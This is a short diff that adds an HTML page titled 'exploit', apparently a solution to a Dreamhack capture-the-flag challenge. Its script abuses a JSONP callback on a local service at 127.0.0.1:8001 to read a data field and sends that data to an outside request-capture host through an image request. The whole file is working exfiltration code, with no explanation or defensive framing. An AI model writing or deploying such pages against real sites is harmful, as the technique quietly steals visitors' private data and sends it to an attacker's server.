@@ -1,0 +1,20 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>exploit</title>
+</head>
+<body>
+<script>
+  function exfil(data) {
+    var u = 'https://uukhrfv.request.dreamhack.games?d=' + encodeURIComponent(data.info);
+    var i = new Image();
+    i.src = u;
+  }
+
+  var s = document.createElement('script');
+  s.src = 'http://127.0.0.1:8001/callback?callback=exfil';
+  document.head.appendChild(s);
+</script>
+</body>
+</html>
